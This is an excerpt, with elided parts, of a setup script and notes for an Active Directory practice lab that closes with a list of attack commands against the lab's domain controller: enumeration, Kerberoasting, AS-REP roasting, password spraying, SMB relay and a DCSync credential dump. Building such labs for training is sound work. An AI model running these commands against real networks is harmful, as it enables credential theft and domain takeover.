...
function Set-StaticIPAddress {
    ...
    try {
        ...
        # Set DNS to loopback (this server will be the DNS server)
...
2. Create Windows 10/11 Client VMs:
   - Network: Same as DC ($StaticIP network)
   - DNS Server: $StaticIP
...
# Initial Enumeration
nmap -p 88,389,445,135,139 $StaticIP
enum4linux -a $StaticIP

# Kerberoasting
GetUserSPNs.py $DomainName/user:password -dc-ip $StaticIP -request

# AS-REP Roasting
GetNPUsers.py $DomainName/ -dc-ip $StaticIP -usersfile users.txt -format hashcat

# BloodHound Collection
SharpHound.exe -c All -d $DomainName --zipfilename bh_data.zip

# Password Spraying
crackmapexec smb $StaticIP -u users.txt -p 'ncc1701'
crackmapexec smb $StaticIP -u users.txt -p 'Changeme123!'

# SMB Relay (since signing is disabled)
ntlmrelayx.py -tf targets.txt -smb2support

# DCSync Attack (if you compromise a user with DCSync rights)
secretsdump.py $DomainName/user:password@$StaticIP
